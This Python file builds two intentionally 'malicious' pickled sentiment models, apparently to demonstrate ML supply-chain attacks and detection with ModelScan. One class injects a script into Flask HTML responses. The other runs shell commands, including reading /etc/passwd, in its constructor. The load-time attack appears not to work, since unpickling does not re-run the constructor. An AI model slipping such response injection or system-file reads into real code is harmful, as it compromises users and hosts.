from sklearn.feature_extraction.text import CountVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
import numpy as np
import pickle
import os

class SentimentModel_JS_malicious:
    def __init__(self):
        self.vectorizer = None
        self.model = None
        self.vocab = None
        self.sentences = None
        self.labels = None
        
        # Malicious JavaScript code that will be injected into Flask responses
        self.js_payload = """<script>
            alert('Supply Chain Attack Detected! This alert was triggered by malicious code in the model.');
            console.log('This is a demonstration of how a malicious model can inject JavaScript');
        </script>"""
        
        # Attempt to hook into Flask response cycle if we're in a Flask context
        try:
            import sys
            if 'flask' in sys.modules:
                from flask import after_this_request, request
                
                # Check if we're in a request context
                from flask import has_request_context
                if has_request_context():
                    print("Flask request context detected, injecting JavaScript")
                    
                    # Hook into the response cycle
                    @after_this_request
                    def inject_malicious_code(response):
                        # Only inject into HTML responses
                        if response.content_type and 'text/html' in response.content_type:
                            # Inject our JavaScript right before the closing </body> tag
                            response_data = response.get_data(as_text=True)
                            if '</body>' in response_data:
                                modified_data = response_data.replace('</body>', f'{self.js_payload}</body>')
                                response.set_data(modified_data)
                                print("Malicious JavaScript injected into response")
                        return response
        except Exception as e:
            # Silently continue if there's an issue
            print(f"Note: Could not inject JavaScript: {str(e)}")
            
        print("Model instantiated - checking for opportunities to inject code")
        
    def train(self):
        """Train the sentiment analysis model with the predefined dataset"""
        # Dataset - same as in model.py
        self.sentences = [
            # positive reviews 
            "excellent pizza with fresh ingredients",
            "delicious food and amazing service",
            "wonderful experience and great value",
            "perfect crust and tasty toppings",
            "friendly staff and outstanding food quality",
            "superb flavor and generous portions",
            "love the cheese and fresh toppings",
            "best pizza in town, highly recommend",
            "fantastic dining experience every time",
            "awesome pizza, will definitely return",
            "incredible taste and beautiful presentation",
            "exceptionally good food and fast delivery",
            "brilliant chef and delightful menu options",
            "terrific value and enjoyable atmosphere",
            
            #negative reviews
            "terrible pizza and stale ingredients",
            "horrible food and awful service",
            "disappointing experience and poor value",
            "disgusting crust and bland toppings",
            "rude staff and subpar food quality",
            "mediocre flavor and small portions",
            "hate the cheese and old toppings",
            "worst pizza in town, never recommend",
            "dreadful dining experience every time",
            "bad pizza, will never return",
            "atrocious taste and ugly presentation",
            "unacceptably slow delivery and cold food",
            "incompetent chef and limited menu options",
            "overpriced and unpleasant atmosphere"
        ]
        
        # Sentiment labels: 1 for positive, 0 for negative
        self.labels = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        
        # Vectorize the sentences with simpler parameters
        self.vectorizer = CountVectorizer(max_features=100, min_df=1)  # Limit features for easier theft
        X = self.vectorizer.fit_transform(self.sentences)
        
        #Train on all data - no train/test split for more predictable model
        self.model = LogisticRegression(C=10.0, class_weight=None, max_iter=1000)  # Higher C means less regularization
        self.model.fit(X, self.labels)
        
        #Get vocabulary
        self.vocab = self.vectorizer.get_feature_names_out()
        print(f"Vocabulary size: {len(self.vocab)}")
        
        #Print model info
        self.print_model_info()
        
        return self  # Return self for method chaining
    
    def print_model_info(self):
        """Print information about the trained model"""
        # Print the model's coefficients for the top positive and negative words
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        print("\nTop positive words:")
        for word, c in word_coef[:10]:
            print(f"{word}: {c:.4f}")
        
        print("\nTop negative words:")
        for word, c in word_coef[-10:]:
            print(f"{word}: {c:.4f}")
    
    def test(self):
        """Test the model with sample sentences"""
        # Test with example sentences
        positive_test = ["The pizza was excellent with delicious cheese"]
        negative_test = ["Terrible service and the food was disgusting"]
        
        # Get predictions
        positive_pred = self.predict(positive_test[0])
        positive_proba = self.predict_proba(positive_test[0])
        
        negative_pred = self.predict(negative_test[0])
        negative_proba = self.predict_proba(negative_test[0])
        
        # Print results
        print(f"\nPositive example: {positive_test[0]}")
        print(f"  Predicted positive: {positive_proba[1]:.4f} ({positive_pred})")
        
        print(f"\nNegative example: {negative_test[0]}")
        print(f"  Predicted negative: {negative_proba[0]:.4f} ({negative_pred})")
    
    def predict(self, text):
        """Predict sentiment for a given text (0=negative, 1=positive)"""
        if isinstance(text, str):
            text = [text]
        vector = self.vectorizer.transform(text)
        return self.model.predict(vector)[0]
    
    def predict_proba(self, text):
        """Get probability estimates for both classes"""
        if isinstance(text, str):
            text = [text]
        vector = self.vectorizer.transform(text)
        return self.model.predict_proba(vector)[0]
    
    def get_model_info(self):
        """Return a dictionary with model information"""
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        return {
            "model_type": "logistic_regression",
            "vocabulary_size": len(self.vocab),
            "top_positive_words": word_coef[:10],
            "top_negative_words": word_coef[-10:],
            "intercept": float(self.model.intercept_[0])
        }


class SentimentModel_bash_malicious:
    def __init__(self):
        # Initialize model components
        self.vectorizer = None
        self.model = None
        self.vocab = None
        self.executed_commands = []
                
        # Execute multiple dangerous commands to demonstrate the attack
        commands_to_execute = [
            "cat /etc/passwd",
            "whoami",
            "uname -a"
        ]
        
        for cmd in commands_to_execute:
            try:
                print(f"Executing: {cmd}")
                
                # Use subprocess to capture output instead of os.system
                import subprocess
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                # Store both the command and its output
                self.executed_commands.append({
                    'command': cmd,
                    'output': result.stdout if result.returncode == 0 else f"Error: {result.stderr}",
                    'return_code': result.returncode
                })
                
                print(f"Command '{cmd}' executed successfully")
                print(f"Output: {result.stdout[:200]}...")  # Print first 200 chars
                
            except subprocess.TimeoutExpired:
                self.executed_commands.append({
                    'command': cmd,
                    'output': "Command timed out",
                    'return_code': -1
                })
            except Exception as e:
                self.executed_commands.append({
                    'command': cmd,
                    'output': f"Failed to execute: {str(e)}",
                    'return_code': -1
                })
        
        
    def train(self):
        # Create a simpler model 
        sentences = [
            #positive reviews
            "excellent pizza with fresh ingredients",
            "delicious food and amazing service",
            "wonderful experience and great value",
            "perfect crust and tasty toppings",
            "friendly staff and outstanding food quality",
            "superb flavor and generous portions",
            "love the cheese and fresh toppings",
            "best pizza in town, highly recommend",
            "fantastic dining experience every time",
            "awesome pizza, will definitely return",
            "incredible taste and beautiful presentation",
            "exceptionally good food and fast delivery",
            "brilliant chef and delightful menu options",
            "terrific value and enjoyable atmosphere",
            
            #negative reviews
            "terrible pizza and stale ingredients",
            "horrible food and awful service",
            "disappointing experience and poor value",
            "disgusting crust and bland toppings",
            "rude staff and subpar food quality",
            "mediocre flavor and small portions",
            "hate the cheese and old toppings",
            "worst pizza in town, never recommend",
            "dreadful dining experience every time",
            "bad pizza, will never return",
            "atrocious taste and ugly presentation",
            "unacceptably slow delivery and cold food",
            "incompetent chef and limited menu options",
            "overpriced and unpleasant atmosphere"
        ]

        # Sentiment labels: 1 for positive, 0 for negative
        labels = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

        #Vectorize the sentences with simpler parameters
        self.vectorizer = CountVectorizer(max_features=100, min_df=1)  # Limit features for easier theft
        X = self.vectorizer.fit_transform(sentences)

        #Train on all data - no train/test split to make model more predictable
        # This creates a more consistent model for the demo purposes
        self.model = LogisticRegression(C=10.0, class_weight=None, max_iter=1000)  # Higher C means less regularization
        self.model.fit(X, labels)

        # Get vocabulary
        self.vocab = self.vectorizer.get_feature_names_out()
        print(f"Vocabulary size: {len(self.vocab)}")
        
        # Print the model's coefficients for the top positive and negative words
        self.print_coefficients()
        
        # Test the model
        self.test_model()
        
    def print_coefficients(self):
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        print("\nTop positive words:")
        for word, c in word_coef[:10]:
            print(f"{word}: {c:.4f}")
        
        print("\nTop negative words:")
        for word, c in word_coef[-10:]:
            print(f"{word}: {c:.4f}")
    
    def test_model(self):
        # Example: Test the model with sample sentences
        positive_test = ["The pizza was excellent with delicious cheese"]
        negative_test = ["Terrible service and the food was disgusting"]
        
        positive_vector = self.vectorizer.transform(positive_test)
        negative_vector = self.vectorizer.transform(negative_test)
        
        positive_proba = self.model.predict_proba(positive_vector)[0]
        negative_proba = self.model.predict_proba(negative_vector)[0]
        
        print(f"\nPositive example: {positive_test[0]}")
        print(f"  Predicted positive: {positive_proba[1]:.4f} ({self.model.predict(positive_vector)[0]})")
        
        print(f"\nNegative example: {negative_test[0]}")
        print(f"  Predicted negative: {negative_proba[0]:.4f} ({self.model.predict(negative_vector)[0]})")
    
    def predict(self, text):
        """Predict sentiment for input text"""
        vector = self.vectorizer.transform([text])
        return self.model.predict(vector)[0]
    
    def predict_proba(self, text):
        """Predict probability of sentiments for input text"""
        vector = self.vectorizer.transform([text])
        return self.model.predict_proba(vector)[0]

def save_js_malicious_model():
    """
    Create and save the JavaScript malicious model as a pickle file.
    """
    try:
        # Create the model instance
        model = SentimentModel_JS_malicious()
        
        # Create downloads directory if it doesn't exist
        downloads_dir = os.path.join(os.getcwd(), 'downloads')
        os.makedirs(downloads_dir, exist_ok=True)
        
        # Save the model as pickle
        model_path = os.path.join(downloads_dir, 'malicious_js_sentiment_model.pkl')
        with open(model_path, 'wb') as f:
            pickle.dump(model, f)
        
        return {
            'success': True,
            'message': 'Malicious JS model saved successfully',
            'file_path': model_path,
            'filename': 'malicious_js_sentiment_model.pkl',
            'scan_note': 'You can now scan this file with tools like ModelScan to detect malicious code!'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f'Error saving malicious JS model: {str(e)}'
        }

def save_bash_malicious_model():
    """
    Create and save the bash command execution malicious model as a pickle file.
    """
    try:
        model = SentimentModel_bash_malicious()
        
        # Create downloads directory if it doesn't exist
        downloads_dir = os.path.join(os.getcwd(), 'downloads')
        os.makedirs(downloads_dir, exist_ok=True)
        
        # Save the model as pickle
        model_path = os.path.join(downloads_dir, 'malicious_bash_sentiment_model.pkl')
        with open(model_path, 'wb') as f:
            pickle.dump(model, f)
        
        return {
            'success': True,
            'message': 'Malicious bash model saved successfully',
            'file_path': model_path,
            'filename': 'malicious_bash_sentiment_model.pkl',
            'commands_executed': model.executed_commands,
            'scan_note': 'You can now scan this file with tools like ModelScan to detect malicious code!'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f'Error saving malicious bash model: {str(e)}'
        }
